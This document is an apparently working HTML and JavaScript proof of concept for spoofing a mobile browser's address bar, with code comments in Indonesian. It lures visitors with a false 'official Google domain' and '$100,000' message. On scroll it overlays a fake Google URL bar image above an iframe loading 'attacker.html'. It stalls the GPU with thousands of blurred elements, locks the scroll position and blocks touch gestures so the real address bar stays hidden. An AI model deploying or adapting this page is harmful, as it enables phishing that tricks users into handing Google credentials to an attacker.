<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
    />
    <title>azzzab</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 200vh;
        background-color: #f8f9fa;
        font-family: sans-serif;
        overflow-x: hidden;
        /* POWERFULL: Matikan efek mantul browser */
        overscroll-behavior: none !important; 
      }

      #scroll-bait {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        text-align: center;
        color: #5f6368;
        padding: 20px;
      }

      #fake-ui {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        z-index: 99999;
        background: #fff;
        /* Blokir semua gesture default browser di container ini */
        touch-action: none !important; 
      }

      #fake-bar {
        position: absolute;
        /* POSISI: Taruh di TOP biar dia nindih area Omnibox asli yang ngumpet */
        top: 0; 
        left: 0;
        width: 100%;
        height: 56px;
        object-fit: contain;
        border-bottom: 1px solid #ddd;
        z-index: 100000;
        opacity: 0;
        transition: opacity 0.1s ease-in;
        pointer-events: auto; /* Harus aktif biar bisa megangin scroll */
        
        /* THE ANCHOR: Matikan drag bawaan browser pada gambar */
        -webkit-user-drag: none;
        user-select: none;
        touch-action: none !important;
      }

      #fake-content {
        position: absolute;
        top: 56px; /* Kasih space buat bar di atas */
        left: 0;
        width: 100%;
        height: calc(100vh - 56px);
        border: none;
        z-index: 1;
      }

      #gpu-killer {
        position: fixed;
        top: 0;
        left: 0;
        width: 1px;
        height: 1px;
        pointer-events: none;
        z-index: 1;
      }
    </style>
  </head>
  <body>
    <div id="scroll-bait">
      <h2>
        This is the official Google domain. Want to earn $100,000? <br>
        Please scroll down to proceed to accounts.google.com.
      </h2>
      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
    </div>

    <div id="gpu-killer"></div>

    <div id="fake-ui">
      <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
      <iframe id="fake-content" src="attacker.html"></iframe>
    </div>

    <script>
      let isSpoofed = false;

      function triggerMeltdown() {
        const killerContainer = document.getElementById("gpu-killer");
        for (let i = 0; i < 2500; i++) {
          let div = document.createElement("div");
          div.style.cssText = `position:absolute; width:100vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(15px);`;
          killerContainer.appendChild(div);
        }
        let start = Date.now();
        while (Date.now() - start < 450) {} 
      }

      window.addEventListener(
        "scroll",
        () => {
          if (window.scrollY > 80 && !isSpoofed) {
            isSpoofed = true;
            document.getElementById("fake-ui").style.display = "block";
            
            triggerMeltdown();
            
            // STAY AT 1PX: Jangan biarkan koordinat nyentuh 0 (Top)
            window.scrollTo(0, 1);
          }
        },
        { passive: true },
      );

      window.addEventListener("message", (e) => {
        if (e.data === "SNAP_TRAP") {
          let fakeBar = document.getElementById("fake-bar");
          fakeBar.style.opacity = "1";
          
          // LOCK COORDINATE: Paksa stay di 1px tiap 10ms
          setInterval(() => {
            if(isSpoofed && window.pageYOffset !== 1) window.scrollTo(0, 1);
          }, 10);
        }
      });

      // THE "OMNIBOX HOLDER" LOGIC
      // Kita cegat jempol user di area fake bar agar tidak diteruskan ke browser
      const fb = document.getElementById("fake-bar");
      
      const killEvent = (e) => {
          if (isSpoofed) {
              e.preventDefault();
              e.stopPropagation();
          }
      };

      // Blokir semua event yang bisa memicu 'Show Address Bar'
      ['touchstart', 'touchmove', 'touchend', 'gesturestart'].forEach(evt => {
          fb.addEventListener(evt, killEvent, { passive: false });
          // Kita juga pasang di container UI nya biar ganda proteksinya
          document.getElementById("fake-ui").addEventListener(evt, killEvent, { passive: false });
      });

    </script>
  </body>
</html>
